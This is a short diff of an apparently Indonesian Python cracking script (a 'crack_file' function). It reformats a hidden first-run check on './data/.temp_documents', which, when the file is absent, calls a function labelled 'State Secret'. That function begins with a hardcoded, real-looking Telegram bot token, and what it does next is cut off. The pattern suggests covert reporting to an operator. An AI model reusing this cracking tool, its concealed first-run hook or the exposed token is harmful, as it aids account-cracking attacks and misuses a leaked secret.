@@ -761,16 +761,15 @@ def crack_file():
 
 
 # -----------------[Rahasia Negara]-------------------#
-datakuje = []
 def maindulu():
-	try:
-		rawr = "./data/.temp_documents"
-		if os.path.exists(rawr):
-			menu()
-		if not os.path.exists(rawr):
-			maindulu2()
-	except:
-		maindulu2()
+    try:
+        rawr = "./data/.temp_documents"
+        if os.path.exists(rawr):
+            menu()
+        else:
+            maindulu2()
+    except:
+        maindulu2()
 	    
 def maindulu2():
 	BOT_TOKEN = "7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM"  # Ganti dengan token bot Telegram Anda
